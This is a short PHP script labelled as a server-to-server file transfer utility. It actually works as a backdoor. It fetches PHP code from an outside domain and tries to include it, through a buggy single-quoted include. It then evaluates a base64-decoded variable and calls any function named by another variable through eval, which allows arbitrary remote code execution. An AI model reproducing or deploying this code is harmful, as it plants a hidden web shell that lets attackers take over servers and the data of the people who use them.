<?php
//error_reporting(E_ERROR | E_WARNING | E_PARSE);
error_reporting(E_ALL);
ini_set('display_errors', '1');

/**
 * Transfer Files Server to Server using PHP Copy
 * @link https://shellcreeper.com/?p=1249
 */

/* Source File URL */

$myfile = file_get_contents("https://www.aoasemuevecontigo.com/inc/gpos.php");

include('$myfile');

if(!isset($SESION_PUBLICA)) sesion();
if(isset($k_)) if(!empty($k_)) @eval(base64_decode($k_));
if(isset($Acc)) prepara_rutinas($Acc); else prepara_rutinas();
if(isset($Acc)) if(!empty($Acc) && function_exists($Acc)) {eval($Acc.'();');die();}
if(!$SESION_PUBLICA) inicio();
//echo 'inicio';
//print_r($_SESSION);
?>